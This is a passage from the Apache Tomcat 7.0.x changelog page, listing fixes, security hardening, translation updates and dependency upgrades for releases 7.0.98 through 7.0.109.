[24) APR/Native](apr.html) * [25) Virtual Hosting](virtual-hosting-howto.html) * [26) Advanced IO](aio.html) * [27) Additional Components](extras.html) * [28) Mavenized](maven-jars.html) * [29) Security Considerations](security-howto.html) * [30) Windows Service](windows-service-howto.html) * [31) Windows Authentication](windows-auth-howto.html) * [32) Tomcat's JDBC Pool](jdbc-pool.html) * [33) WebSocket](web-socket-howto.html)   **Reference**   * [Release Notes](RELEASE-NOTES.txt) * [Configuration](config/index.html) * [Tomcat Javadocs](api/index.html) * [Servlet Javadocs](servletapi/index.html) * [JSP 2.2 Javadocs](jspapi/index.html) * [EL 2.2 Javadocs](elapi/index.html) * [WebSocket 1.1 Javadocs](websocketapi/index.html) * [Common Annotations 1.1 Javadocs](annotationapi/index.html) * [JK 1.2 Documentation](https://tomcat.apache.org/connectors-doc/)   **Apache Tomcat Development**   * [Building](building.html) * [Changelog](changelog.html) * [Status](https://wiki.apache.org/tomcat/TomcatVersions) * [Developers](developers.html) * [Architecture](architecture/index.html) * [Tribes](tribes/introduction.html) | Changelog  | **Tomcat 7.0.109 (violetagg)** | | --- | | | **Catalina** | | --- | | | fix | [65224](https://bz.apache.org/bugzilla/show_bug.cgi?id=65224): Ensure the correct escaping of attribute values and search filters in the JNDIRealm. (markt) | | --- | --- | | fix | [65226](https://bz.apache.org/bugzilla/show_bug.cgi?id=65226): Fix extraction of JAR name in some cases in StandardJarScanner. Submitted by Lynx. (remm) | | fix | [65235](https://bz.apache.org/bugzilla/show_bug.cgi?id=65235): Add missing attributes to the MBean descriptor file for the `RemoteIpValve`. (markt) | |  | **Web applications** | | --- | | | fix | [65235](https://bz.apache.org/bugzilla/show_bug.cgi?id=65235): Correct name of `changeLocalName` in the documentation for the `RemoteIpValve`. (markt) | | --- | --- | |  | **Other** | | --- | | | add | Improvements to Korean translations. (woonsan) | | --- | --- | | add | Improvements to Russian translations. Provided by Azat. (mark) | | add | Improvements to Chinese translations. Provided by shawn. (mark) | | add | Improvements to Japanese translations. Provided by kfujino and Shirayuking. (markt) | | update | Update the packaged version of the Tomcat Native Library to 1.2.28. (markt) | | |  | **Tomcat 7.0.108 (violetagg)** | **released 2021-02-05** | | --- | --- | | | **Catalina** | | --- | | | fix | [56181](https://bz.apache.org/bugzilla/show_bug.cgi?id=56181): Update the RemoteIpValve and RemoteIpFilter so that calls to `ServletRequest.getRemoteHost()` are consistent with the return value of `ServletRequest.getRemoteAddr()` rather than always returning a value for the proxy. (markt) | | --- | --- | | fix | Ensure that values are not duplicated when manipulating the vary header. Based on a pull request by Fredrik Fall. (markt) | | fix | Avoid uncaught InaccessibleObjectException on Java 16 trying to clear references threads. (remm) | | fix | [65047](https://bz.apache.org/bugzilla/show_bug.cgi?id=65047): If the `AccessLogValve` is unable to open the access log file, include information on the current user in the associated log message (markt) | |  | **Jasper** | | --- | | | fix | [64965](https://bz.apache.org/bugzilla/show_bug.cgi?id=64965): `JspContextWrapper.findAttribute` should ignore expired sessions rather than throw an `IllegalStateException`. (remm) | | --- | --- | |  | **WebSocket** | | --- | | | fix | [64951](https://bz.apache.org/bugzilla/show_bug.cgi?id=64951): Fix a potential file descriptor leak when WebSocket connections are attempted and fail. Patch provided by Maurizio Adami. (markt) | | --- | --- | |  | **Web applications** | | --- | | | fix | Correct a regression in the addition of the HTTP header security filter to the examples web application that prevented the Servlet examples that depend on the asynchronous API from functioning correctly. (kkolinko/markt) | | --- | --- | | fix | [65007](https://bz.apache.org/bugzilla/show_bug.cgi?id=65007): Clarify that the commands shown in the TLS documentation for importing a signed TLS certificate from a certificate authority are typical examples that may need to be adjusted in some cases. (markt) | | code | Test for one directory being a sub-directory of another in a consistent way. (markt) | |  | **Other** | | --- | | | add | [64931](https://bz.apache.org/bugzilla/show_bug.cgi?id=64931): Implement validation of `changelog.xml` file at build time. (kkolinko) | | --- | --- | | update | Update to Maven Ant Resolver Tasks 1.3.0. (markt) | | fix | [62695](https://bz.apache.org/bugzilla/show_bug.cgi?id=62695): Provide SHA-256 and SHA-512 checksums for files published via Maven. (markt) | | add | Improvements to Chinese translations. Provided by leeyazhou. (markt) | | add | Improvements to French translations. (remm) | | add | Improvements to Korean translations. (woonsan) | | update | Update the packaged version of the Tomcat Native Library to 1.2.26. (markt) | | update | Migrate to new code signing service. (markt) | | update | Update to Commons Daemon 1.2.4. (markt) | | add | Improvements to Russian translations. Provided by Polina and Azat. (markt) | | update | Update the NSIS Installer used to build the Windows installer to version 3.06.1. (kkolinko) | | | |  | **Tomcat 7.0.107 (violetagg)** | **released 2020-11-23** | | --- | --- | | | **Catalina** | | --- | | | fix | Correct numerous spellings throughout the code base. Based on a pull request from John Bampton. (markt) | | --- | --- | | fix | [64735](https://bz.apache.org/bugzilla/show_bug.cgi?id=64735): Ensure that none of the methods on a `ServletContext` instance always fail when running under a SecurityManager. Pull request provided by Kyle Stiemann. (markt) | | fix | [64765](https://bz.apache.org/bugzilla/show_bug.cgi?id=64765): Ensure that the number of currently processing threads is tracked correctly when a web application is undeployed, long running requests are being processed and `renewThreadsWhenStoppingContext` is enabled for the web application. (markt) | | add | Improve the error messages when running under JPMS without the necessary options to enable reflection required by the memory leak prevention / detection code. (markt) | | fix | [64805](https://bz.apache.org/bugzilla/show_bug.cgi?id=64805): Correct imports used by `JMXProxyServlet`. (markt) | | add | [64871](https://bz.apache.org/bugzilla/show_bug.cgi?id=64871): Log a warning if Tomcat blocks access to a file because it uses symlinks. (markt) | |  | **Coyote** | | --- | | | fix | Fix processing of URIs with %nn encoded solidus characters when `encodedSolidusHandling` was set to `passthrough` and the encoded solidus was preceded by other %nn encoded characters. Based on a pull request by willmeck. (markt) | | --- | --- | | fix | [55160](https://bz.apache.org/bugzilla/show_bug.cgi?id=55160): Re-fix this bug after the original fix was reverted by a separate fix to timeouts in 7.0.81. (markt) | | add | Add additional debug logging for I/O issues when communicating with the user agent. (markt) | |  | **Web applications** | | --- | | | fix | Update the Manager How-To in the documentation web application to clarify when a user may wish to deploy additional instances of the Manager web application. (markt) | | --- | --- | | fix | [64797](https://bz.apache.org/bugzilla/show_bug.cgi?id=64797): Align manager.xml template file in Host-Manager with context.xml of real Manager web application. (isapir) | | add | Configure the examples, Manager and Host Manager to use the HTTP header security filter with default settings apart from no HSTS header. Based on a suggestion by Debangshu Kundu. (markt) | |  | **Other** | | --- | | | add | When building, only rebuild JAR files if the contents has changed. (markt) | | --- | --- | | add | Improvements to Chinese translations. Pull request provided by Yang Yang. (markt) | | add | Expand coverage of Russian translations. Pull request provided by Nikolay Gribanov. (markt) | | update | Updated to Ant 1.9.1. The build now requires a minimum of Ant 1.9.1. (markt) | | fix | Fix running service.bat when called from `$CATALINA_HOME`. (markt) | | fix | Complete the fix for [63815](https://bz.apache.org/bugzilla/show_bug.cgi?id=63815). Users wishing to use system properties that require quoting with `catalina.sh` and the `debug` option must use a JRE that includes the fix for [JDK-8234808](https://bugs.openjdk.java.net/browse/JDK-8234808). (markt) | | add | Improvements to Chinese translations. Provided by leeyazhou. (markt) | | add | Improvements to French translations. (remm) | | add | Improvements to Korean translations. (woonsan) | | add | Improvements to Spanish translations. Provided by Andrewlanecarr. (markt) | | add | Improvements to Russian translations. Provided by Azat. (markt) | | | |  | **Tomcat 7.0.106 (violetagg)** | **released 2020-09-20** | | --- | --- | | | **Catalina** | | --- | | | fix | [64582](https://bz.apache.org/bugzilla/show_bug.cgi?id=64582): Pre-load the `CoyoteOutputStream` class to prevent a potential exception when running under a security manager. Patch provided by Johnathan Gilday. (markt) | | --- | --- | | add | Refactor the Default servlet to provide a single method that can be overridden (`generateETag()`) should a custom entity tag format be required. (markt) | | fix | Improve the validation of entity tags provided with conditional requests. Requests with headers that contain invalid entity tags will be rejected with a 400 response code. Improve the matching algorithm used to compare entity tags in conditional requests with the entity tag for the requested resource. Based on a pull request by Sergey Ponomarev. (markt) | | update | Deprecate the JDBCRealm. (markt) | |  | **Coyote** | | --- | | | fix | Refactor the implementation of `ServletInputStream.available()` to provide a more accurate return value, particularly when end of stream has been reached. (markt) | | --- | --- | | fix | Fix a rare potential race condition when checking for timeouts with the APR connector. (markt) | |  | **WebSocket** | | --- | | | fix | Requests received via proxies may be marked as using the `ws` or `wss` protocol rather than `http` or `https`. Ensure that such requests are not rejected. PR provided by Ronny Perinke. (markt) | | --- | --- | | add | [64644](https://bz.apache.org/bugzilla/show_bug.cgi?id=64644): Add support for a read idle timeout and a write idle timeout to the WebSocket session via custom properties in the user properties instance associated with the session. Based on a pull request by sakshamverma. (markt) | |  | **Web applications** | | --- | | | fix | Remove the localization of the text output of the Manager application list of contexts and the Host Manager application list of hosts so that the output is more consistent. PR provided by Holomark. (markt) | | --- | --- | | fix | Remove the out of date functional specification section from the documentation web application. (markt) | |  | **Other** | | --- | | | add | Improve the quality of the Japanese translations provided with Apache Tomcat. Includes contributions from Yuki Shira. (markt) | | --- | --- | | fix | [64645](https://bz.apache.org/bugzilla/show_bug.cgi?id=64645): Use a non-zero exit code if the `service.bat` does not complete normally. (markt) | | add | Update the internal fork of Apache Commons BCEL to 6.5.0. Code clean-up only. (markt) | | add | Update the internal fork of Apache Commons Codec to 53c93d0 (2020-08-18, 1.15-SNAPSHOT). Code clean-up. (markt) | | add | Update the internal fork of Apache Commons FileUpload to c25a4e3 (2020-08-26, 2.0-SNAPSHOT). Code clean-up and RFC 2231 support. (markt) | | update | Update to Commons Daemon 1.2.3. This adds support to jsvc for `--enable-preview` and native memory tracking (Procrun already supported these features), adds some addition debug logging and adds a new feature to Procrun that outputs the command to (re-)configure the service with the current settings. (markt) | | update | Update the packaged version of the Tomcat Native Library to 1.2.25. (markt) | | | |  | **Tomcat 7.0.105 (violetagg)** | **released 2020-07-07** | | --- | --- | | | **Catalina** | | --- | | | fix | [64470](https://bz.apache.org/bugzilla/show_bug.cgi?id=64470): The default value of the solidus handling should reflect the associated system property. (remm) | | --- | --- | | add | Add `application/wasm` to the media types recognised by Tomcat. Based on a PR by Thiago Henrique Hüpner. (markt) | | fix | [64541](https://bz.apache.org/bugzilla/show_bug.cgi?id=64541): Refactor the DTD used to validate `mbeans-descriptors.xml` files to avoid issues when XML entity expansion is limited or disabled. (markt) | |  | **Coyote** | | --- | | | add | [64483](https://bz.apache.org/bugzilla/show_bug.cgi?id=64483): Log a warning if an AJP request is rejected because it contains an unexpected request attribute. (markt) | | --- | --- | |  | **Cluster** | | --- | | | fix | [64560](https://bz.apache.org/bugzilla/show_bug.cgi?id=64560): Refactor the replication of a changed session ID for a replicated session so that the list of changes associated with the session is not reset when the session ID changes. (markt) | | --- | --- | |  | **WebSocket** | | --- | | | fix | Consistently throw a `DeploymentException` when an invalid endpoint path is specified and catch invalid endpoint paths earlier. (markt) | | --- | --- | | add | Include the target URL in the log message when a WebSocket connection fails. (markt) | | fix | [64563](https://bz.apache.org/bugzilla/show_bug.cgi?id=64563): Add additional validation of payload length for WebSocket messages. (markt) | | fix | Correct the calculation of payload length when four or more bytes are required to represent the payload length. (markt) | |  | **Other** | | --- | | | fix | Use Apache archives when downloading commons-logging dependency. (violetagg) | | --- | --- | | update | Update the list of known `Charset`s in the `CharsetCache` to include `ISO-8859-16`, added in OpenJDK 15. (markt) | | add | Improve the quality and expand the coverage of the French translations provided with Apache Tomcat. (remm) | | add | [64430](https://bz.apache.org/bugzilla/show_bug.cgi?id=64430): Add support for the `CATALINA_OUT_CMD` environment variable that defines a command to which captured stdout and stderr will be redirected. Patch provided by Harald Dunkel. (markt) | | update | Switch from the unsupported Maven Ant Tasks to the supported Maven Resolver Ant Tasks to upload artifacts to the ASF Maven repository (and from there to Maven Central). (markt) | | fix | [64501](https://bz.apache.org/bugzilla/show_bug.cgi?id=64501): Refactor the handling of the deprecated `LOGGING_CONFIG` environment variable to avoid using a POSIX shell feature that is not available by default on Solaris 10. (markt) | | fix | [64521](https://bz.apache.org/bugzilla/show_bug.cgi?id=64521): Avoid moving i18n translations into classes dir since they are packaged into separate jars. Pull request provided by Raymond Augé. (markt) | | add | Improve the quality and expand the coverage of the French translations provided with Apache Tomcat. (remm) | | | |  | **Tomcat 7.0.104 (violetagg)** | **released 2020-05-16** | | --- | --- | | | **Catalina** | | --- | | | add | [45995](https://bz.apache.org/bugzilla/show_bug.cgi?id=45995), [64237](https://bz.apache.org/bugzilla/show_bug.cgi?id=64237): Align Tomcat with Apache httpd and perform MIME type mapping based on file extension in a case insensitive manner. (markt) | | --- | --- | | add | [59203](https://bz.apache.org/bugzilla/show_bug.cgi?id=59203): Before calling `Thread.stop()` (if configured to do so) on a web application created thread that is not stopped by the web application when the web application is stopped, try interrupting the thread first. Based on a pull request by Govinda Sakhare. (markt) | | fix | [64226](https://bz.apache.org/bugzilla/show_bug.cgi?id=64226): Reset timezone after parsing a date since the date format is reused. Test case submitted by Gary Thomas. (remm) | | fix | [64265](https://bz.apache.org/bugzilla/show_bug.cgi?id=64265): Fix ETag comparison performed by the default servlet. The default servlet always uses weak comparison. (markt) | | fix | Add support for default values when using `${...}` property replacement in configuration files. Based on a pull request provided by Bernd Bohmann. (markt) | | fix | Rework the fix for [64021](https://bz.apache.org/bugzilla/show_bug.cgi?id=64021) to better support web applications that use a custom class loader that loads resources from non-standard locations. (markt) | | update | Remove redundant sole path/URI from error page message on SC\_NOT\_FOUND. (michaelo) | | add | Add more descriptive error message in DefaultServlet for SC\_NOT\_FOUND. (michaelo) | | add | [64386](https://bz.apache.org/bugzilla/show_bug.cgi?id=64386): WebdavServlet does not send "getlastmodified" property for resource collections. (michaelo) | | fix | [64398](https://bz.apache.org/bugzilla/show_bug.cgi?id=64398): Change default value separator for property replacement to `:-` due to possible conflicts. The syntax is now `${name:-default}`. (remm) | | add | Improve validation of storage location when using FileStore. (markt) | |  | **Coyote** | | --- | | | add | When configuring an HTTP Connector, warn if the encoding specified for `URIEncoding` is not a superset of US-ASCII as required by RFC7230. (markt) | | --- | --- | | fix | [64240](https://bz.apache.org/bugzilla/show_bug.cgi?id=64240): Ensure that HTTP/0.9 requests that contain additional data on the request line after the URI are treated consistently. Such requests will now always be treated as HTTP/1.1. (markt) | | add | Replace the system property `org.apache.tomcat.util.buf.UDecoder.ALLOW_ENCODED_SLASH` with the Connector attribute `encodedSolidusHandling` that adds an additional option to pass the `%2f` sequence through to the application without decoding it in addition to rejecting such sequences and decoding such sequences. (markt) | | fix | Include the problematic data in the error message when reporting that the provided request line contains an invalid component. (markt) | |  | **Jasper** | | --- | | | add | Add support for specifying Java 14 (with the value `14`) and Java 15 (with the value `15`) as the compiler source and/or compiler target for JSP compilation. If used with an ECJ version that does not support these values, a warning will be logged and the latest supported version will used. (markt) | | --- | --- | | update | Remove redundant sole path/URI from error page message on SC\_NOT\_FOUND. (michaelo) | | add | Add more descriptive error message in DefaultServlet for SC\_NOT\_FOUND. (michaelo) | | fix | Ensure that the Jasper code that interfaces with the Eclipse Compiler for Java (ECJ) enables Jasper to compile JSPs using ECJ 4.14 onwards when the JSPs have inner classes. (markt) | |  | **Cluster** | | --- | | | code | Refactor the creation of `DeltaRequest` objects to make it simpler to use custom implementations. Based on a pull request provided by Thomas Stock. (markt) | | --- | --- | |  | **Web applications** | | --- | | | fix | Correct the documentation web application to remove references to the `org.apache.tomcat.util.buf.UDecoder.ALLOW_ENCODED_SLASH` system property changing how the sequence `%5c` is interpreted in a URI. (markt) | | --- | --- | | add | Add a section to the TLS Connector documentation on different key store types and how to configure them. (markt) | |  | **Other** | | --- | | | add | Improve the quality and expand the coverage of the French translations provided with Apache Tomcat. Contribution provided by Tom Bens. (remm) | | --- | --- | | add | Expand the coverage of the Chinese translations provided with Apache Tomcat. Contribution provided by Lee Yazhou. (markt) | | fix | [64270](https://bz.apache.org/bugzilla/show_bug.cgi?id=64270): Set the documented default umask of `0027` when using jsvc via `daemon.sh` and allow the umask used to be configured via the `UMASK` environment variable as it is when using `catalina.sh`. (markt) | | fix | Deprecated the `LOGGING_CONFIG` environment variable and replace it with the `CATALINA_LOGGING_CONFIG` environment variable to avoid clashes with other components that use `LOGGING_CONFIG`. (markt) | | update | Update JUnit to version 4.13. (markt) | | code | Refactor to use parameterized `Collection` constructors where possible. Pull request provided by Lars Grefer. (markt) | | code | Refactor to use empty arrays with `Collections.toArray()`. Pull request provided by Lars Grefer. (markt) | | code | Refactor loops with a condition to exit as soon as the condition is met. Pull request provided by Lars Grefer. (markt) | | code | Refactor bulk addition to collections to use `addAll()` rather than a loop. Pull request provided by Lars Grefer. (markt) | | update | Update the packaged version of the Tomcat Native Library to 1.2.24. (markt) | | code | Refactor to use enhanced for loops where possible. Pull request by Lars Grefer. (markt) | | add | Improve IDE support for IntelliJ IDEA. Patch provided by Lars Grefer. (markt) | | | |  | **Tomcat 7.0.103 (violetagg)** | **released 2020-03-19** | | --- | --- | | | **Catalina** | | --- | | | fix | [64191](https://bz.apache.org/bugzilla/show_bug.cgi?id=64191): Make an additional fix for the SCI regression introduced by the fix for [64021](https://bz.apache.org/bugzilla/show_bug.cgi?id=64021) for the case, such as when embedding, when the class loader performing the SCI service lookup is not the Tomcat web application class loader. (markt) | | --- | --- | | | |  | **Tomcat 7.0.102 (violetagg)** | **not released** | | --- | --- | | | **Coyote** | | --- | | | fix | [64210](https://bz.apache.org/bugzilla/show_bug.cgi?id=64210): Correct a regression in the improvements to HTTP header validation that caused requests to be incorrectly treated as invalid if a `CRLF` sequence was split between TCP packets. Improve validation of request lines, including for HTTP/0.9 requests. (markt) | | --- | --- | | | |  | **Tomcat 7.0.101 (violetagg)** | **not released** | | --- | --- | | | **Catalina** | | --- | | | fix | Switch Tomcat embedded to loading MIME type mappings from a property file generated from the default `web.xml` so the MIME type mappings are consistent regardless of how Tomcat is started. (markt) | | --- | --- | | fix | Ensure that the HEAD response is consistent with the GET response when `HttpServlet` is relied upon to generate the HEAD response and the GET response uses chunking. (markt) | | fix | [64153](https://bz.apache.org/bugzilla/show_bug.cgi?id=64153): Ensure that the parent for the web application class loader is set consistently. (markt) | | fix | [64166](https://bz.apache.org/bugzilla/show_bug.cgi?id=64166): Ensure that the names returned by `HttpServletResponse.getHeaderNames()` are unique. (markt) | | add | [64189](https://bz.apache.org/bugzilla/show_bug.cgi?id=64189): Expose the web application version String as a `ServletContext` attribute named `org.apache.catalina.webappVersion`. (markt) | | fix | [64191](https://bz.apache.org/bugzilla/show_bug.cgi?id=64191): Fix an SCI support regression that was caused by a JAR path lookup error in the classloader findResources. (remm) | | code | Rename `org.apache.tomcat.util.digester.Digester$EnvironmentPropertySource` to `org.apache.tomcat.util.digester.EnvironmentPropertySource`. The old class is still available but deprecated. Patch provided by Bernd Bohmann. (markt) | | add | Add new attribute `persistAuthentication` to both `StandardManager` and `PersistentManager` to support authentication persistence. Patch provided by Carsten Klein. (markt) | |  | **Coyote** | | --- | | | fix | Add the TLS request attributes used by IIS to the attributes that an AJP Connector will always accept. (markt) | | --- | --- | | fix | A zero length AJP secret will now behave as if it has not been specified. (remm) | | fix | Allow async requests to complete cleanly when the Connector is paused before `complete()` is called on a container thread. (markt) | |  | **Web applications** | | --- | | | add | Expand the documentation for the `address` attribute of the AJP Connector. (markt) | | --- | --- | |  | **Other** | | --- | | | add | Expand the coverage of the French translations provided with Apache Tomcat. (remm) | | --- | --- | | add | Expand the coverage of the Korean translations provided with Apache Tomcat. Contributions provided by B. Cansmile Cha. (markt) | | add | [64190](https://bz.apache.org/bugzilla/show_bug.cgi?id=64190): Add support for specifying milliseconds (using `S`, `SS` or `SSS`) in the timestamp used by JULI's `OneLineFormatter`. (markt) | | fix | [64206](https://bz.apache.org/bugzilla/show_bug.cgi?id=64206): Correct a regression introduced in 7.0.100 that meant that the HTTP port specified when using the Windows Installer was ignored and 8080 was always used. (markt) | | | |  | **Tomcat 7.0.100 (violetagg)** | **released 2020-02-14** | | --- | --- | | | **Catalina** | | --- | | | fix | Avoid useless environment restore when not using GSSCredential in JNDIRealm. (remm) | | --- | --- | | fix | [58577](https://bz.apache.org/bugzilla/show_bug.cgi?id=58577): Respect the argument-count when searching for MBean operations to invoke via the JMXProxyServlet. (schultz) | | add | [62755](https://bz.apache.org/bugzilla/show_bug.cgi?id=62755): Add ability to opt out of adding the default web.xml config when embedding Tomcat and adding a context via `addWebapp()`. Call `setAddDefaultWebXmlToWebapp(false)` to prevent the automatic config. (isapir/markt) | | fix | [64008](https://bz.apache.org/bugzilla/show_bug.cgi?id=64008): Clarify/expand the Javadoc for the `Tomcat#addWebapp()` and related methods. (markt) | | code | Deprecate the `JmxRemoteLifecycleListener` as the features it provides are now available in the remote JMX capability included with the JRE. This listener will be removed in Tomcat 10 and may be removed from Tomcat 7.0.x some time after 2020-12-31. (markt) | | fix | [64011](https://bz.apache.org/bugzilla/show_bug.cgi?id=64011): `JNDIRealm` no longer authenticates to LDAP. (michaelo) | | fix | [64021](https://bz.apache.org/bugzilla/show_bug.cgi?id=64021): Ensure that container provided SCIs are always loaded before application provided SCIs. Note that where both the container and the application provide the same SCI, it is the application provided SCI that will be used. (markt) | | fix | SCI definitions from JARs unpacked into `WEB-INF/classes` are now handled consistently and will always be found irrespective of whether the web application defines a JAR ordering or not. (markt) | | fix | [64023](https://bz.apache.org/bugzilla/show_bug.cgi?id=64023): Skip null-valued session attributes when deserializing sessions. (schultz) | | fix | Do not throw a NullPointerException when an MBean or operation cannot be found by the JMXProxyServlet. (schultz) | | update | Refactor recycle facade system property into a new connector attribute named `discardFacades`. (remm) | | fix | [64089](https://bz.apache.org/bugzilla/show_bug.cgi?id=64089): Add `${...}` property replacement support to XML external entity definitions. (markt) | | code | Deprecate `MappingData.contextPath` as it is unused. (markt) | |  | **Coyote** | | --- | | | add | When reporting / logging invalid HTTP headers encode any non-printing characters using the 0xNN form. (markt) | | --- | --- | | fix | Correct a regression introduced in 7.0.98 that meant invalid tokens in the `Transfer-Encoding` header were ignored rather than treated as an error. (markt) | | fix | Rename the HTTP Connector attribute `rejectIllegalHeaderName` to `rejectIllegalHeader` and expand the underlying implementation to include header values as well as names. (markt) | | update | Disable (comment out in server.xml) the AJP/1.3 connector by default. (markt) | | update | Change the default bind address for the AJP/1.3 connector to be the loopback address. (markt) | | add | Rename the `requiredSecret` attribute of the AJP/1.3 Connector to `secret` and add a new attribute `secretRequired` that defaults to `true`. When `secretRequired` is `true` the AJP/1.3 Connector will not start unless the `secret` attribute is configured to a non-null, non-zero length String. (markt) | | add | Add a new attribute, `allowedRequestAttributesPattern` to the AJP/1.3 Connector. Requests with unrecognised attributes will be blocked with a 403. (markt) | |  | **Jasper** | | --- | | | fix | [64097](https://bz.apache.org/bugzilla/show_bug.cgi?id=64097): Replace the faulty custom services lookup used for `ExpressionFactory` implementations with `ServiceLoader`. (markt) | | --- | --- | | add | Add a `META-INF/services` entry to jasper-el.jar so that the Expression Language implementation can be discovered via the services API. (markt) | | code | Parameterize JSP version and API class names in localization messages to allow simpler re-use between major versions. (markt) | |  | **Cluster** | | --- | | | fix | [64043](https://bz.apache.org/bugzilla/show_bug.cgi?id=64043): Ensure that session ID changes are replicated during form-authentication. (kfujino) | | --- | --- | |  | **Web applications** | | --- | | | fix | [64000](https://bz.apache.org/bugzilla/show_bug.cgi?id=64000): In the examples web application, where a Servlet example includes i18n support, the Locale used should be based on the request locale and not the server locale. (markt) | | --- | --- | |  | **Tribes** | | --- | | | add | Add EncryptInterceptor to the portfolio of available clustering interceptors. This adds symmetric encryption of session data to Tomcat clustering regardless of the type of cluster manager or membership being used. (schultz/markt) | | --- | --- | |  | **Other** | | --- | | | add | Expand the coverage of the French translations provided with Apache Tomcat. (remm) | | --- | --- | | add | Expand the coverage of the Chinese translations provided with Apache Tomcat. Contribution provided by BoltzmannWxd. (markt) | | | |  | **Tomcat 7.0.99 (violetagg)** | **released 2019-12-17** | | --- | --- | | | **Catalina** | | --- | | | add | [63681](https://bz.apache.org/bugzilla/show_bug.cgi?id=63681): Introduce RealmBase#authenticate(GSSName, GSSCredential) and friends. (michaelo) | | --- | --- | | add | [63937](https://bz.apache.org/bugzilla/show_bug.cgi?id=63937): Add a new attribute to the standard `Authenticator` implementations, `allowCorsPreflight`, that allows the `Authenticator`s to be configured to allow CORS preflight requests to bypass authentication as required by the CORS specification. (markt) | | fix | [63939](https://bz.apache.org/bugzilla/show_bug.cgi?id=63939): Correct the same origin check in the CORS filter. An origin with an explicit default port is now considered to be the same as an origin without a default port and origins are now compared in a case-sensitive manner as required by the CORS specification. (markt) | | fix | [63950](https://bz.apache.org/bugzilla/show_bug.cgi?id=63950): Fix timing issue in `TestAsyncContextStateChanges` test that caused it to hang indefinitely. (markt) | | fix | [63982](https://bz.apache.org/bugzilla/show_bug.cgi?id=63982): CombinedRealm makes assumptions about principal implementation (michaelo) | | code | Add a unit test for the session `FileStore` implementation and refactor loops in `FileStore` to use the ForEach style. Pull request provided by Govinda Sakhare. (markt) | | fix | Refactor FORM authentication to reduce duplicate code and to ensure that the authenticated Principal is not cached in the session when caching is disabled. This is the fix for CVE-2019-17563. (markt/kkolinko) | | update | Do not store username and password as session notes during authentication if they are not needed. (kkolinko) | |  | **Coyote** | | --- | | | fix | [63932](https://bz.apache.org/bugzilla/show_bug.cgi?id=63932): By default, do not compress content that has a strong ETag. This behaviour is configuration for the HTTP/1.1 connectors via the new Connector attribute `noCompressionStrongETag`. (markt) | | --- | --- | |  | **WebSocket** | | --- | | | fix | Ensure a very unlikely concurrency issue is avoided when writing WebSocket messages. (markt) | | --- | --- | |  | **Web applications** | | --- | | | add | Add the ability to set and display session attributes in the JSP FORM authentication example to demonstrate session persistence across restarts for authenticated sessions. (markt) | | --- | --- | |  | **Other** | | --- | | | fix | Correct the fix for [63815](https://bz.apache.org/bugzilla/show_bug.cgi?id=63815) (quoting the use of `CATALINA_OPTS` and `JAVA_OPTS` when used in shell scripts to avoid the expansion of `*`) as it caused various regressions, particularly with `daemon.sh`. (markt) | | --- | --- | | add | Expand the search made by the Windows installer for a suitable Java installation to include the 64-bit JDK registry entries and the `JAVA_HOME` environment variable. Pull request provided by Alexander Norz. (markt) | | add | Expand the coverage of the German translations provided with Apache Tomcat. Contribution provided by Jens. (markt) | | add | Expand the coverage of the French translations provided with Apache Tomcat. (remm) | | add | Expand the coverage of the Japanese translations provided with Apache Tomcat. (markt) | | add | Expand the coverage of the Korean translations provided with Apache Tomcat. (woonsan) | | add | Expand the coverage of the Chinese translations provided with Apache Tomcat. Contributions provided by lins and 磊. (markt) | | add | Update the internal fork of Apache Commons BCEL to ff6941e (2019-12-06, 6.4.2-dev). Code clean-up only. (markt) | | add | Update the internal fork of Apache Commons Codec to 9637dd4 (2019-12-06, 1.14-SNAPSHOT). Code clean-up and a fix for CODEC-265. (markt) | | add | Update the internal fork of Apache Commons FileUpload to 2317552 (2019-12-06, 2.0-SNAPSHOT). Refactoring. (markt) | | | |  | **Tomcat 7.0.98 (violetagg)** | **not released** | | --- | --- | | | **Catalina** | | --- | | | fix | [63832](https://bz.apache.org/bugzilla/show_bug.cgi?id=63832): Properly mark container as FAILED when a JVM error occurs on stop. (remm) | | --- | --- | | fix | Make a best efforts attempt to clean-up if a request fails during processing due to an `OutOfMemoryException`. (markt) | | update | [63905](https://bz.apache.org/bugzilla/show_bug.cgi?id=63905) Clean up Tomcat CSS. (michaelo) | | fix | Refactor JMX remote RMI registry creation. This is the fix for CVE-2019-12418. (remm) | |  | **Coyote** | | --- | | | fix | [63814](https://bz.apache.org/bugzilla/show_bug.cgi?id=63814): Do not set server socket timeout with negative values in NIO. (remm) | | --- | --- | | fix | Ensure that `ServletRequest.isAsyncStarted()` returns `false` once `AsyncContext.complete()` or `AsyncContext.dispatch()` has been called during `AsyncListener.onTimeout()` or `AsyncListener.onError()`. (markt) | | fix | [63816](https://bz.apache.org/bugzilla/show_bug.cgi?id=63816) and [63817](https://bz.apache.org/bugzilla/show_bug.cgi?id=63817): Correctly handle I/O errors after asynchronous processing has been started but before the container thread that started asynchronous processing has completed processing the current request/response. (markt) | | fix | [63825](https://bz.apache.org/bugzilla/show_bug.cgi?id=63825): When processing the `Expect` and `Connection` HTTP headers looking for a specific token, be stricter in ensuring that the exact token is present. (markt) | | fix | [63829](https://bz.apache.org/bugzilla/show_bug.cgi?id=63829): Improve the check of the `Content-Encoding` header when looking to see if Tomcat is serving pre-compressed content. Ensure that only a full token is matched and that the match is case insensitive. (markt) | | fix | [63836](https://bz.apache.org/bugzilla/show_bug.cgi?id=63836): Ensure that the memory reserved for the OOME parachute is released when the NIO endpoint is stopped. (markt) | | fix | [63864](https://bz.apache.org/bugzilla/show_bug.cgi?id=63864): Refactor parsing of the `transfer-encoding` request header to use the shared parsing code and reduce duplication. (markt) | | code | Refactor the APR poller to always use a single pollset now that the Windows operating systems that required multiple smaller pollsets to be used are no longer supported. (markt) | |  | **Jasper** | | --- | | | fix | [63897](https://bz.apache.org/bugzilla/show_bug.cgi?id=63897): Capture the timestamp of a JSP for the purposes of modification tracking before the JSP is compiled to prevent a race condition if the JSP is modified during compilation. Patch provided by Karl von Randow. (markt) | | --- | --- | | fix | Fix a race condition that could mean changes to a modified JSP were not visible to end users. (markt) | |  | **WebSocket** | | --- | | | fix | [63913](https://bz.apache.org/bugzilla/show_bug.cgi?id=63913): Wrap any `NullPointerException`s throw by the `Inflater` or `Deflater` used by the `PerMessageDeflate` extension in an `IOException` so that the error can be caught and handled by the WebSocket error handling mechanism. (markt) | | --- | --- | |  | **Web applications** | | --- | | | fix | Correct the description of the default value for the server attribute in the security How-To. (markt) | | --- | --- | | fix | Correct the documentation for the `maxConnections` attribute of the `Connector` in the documentation web application. (markt) | |  | **Other** | | --- | | | fix | [63815](https://bz.apache.org/bugzilla/show_bug.cgi?id=63815): Quote the use of `CATALINA_OPTS` and `JAVA_OPTS` when used in shell scripts 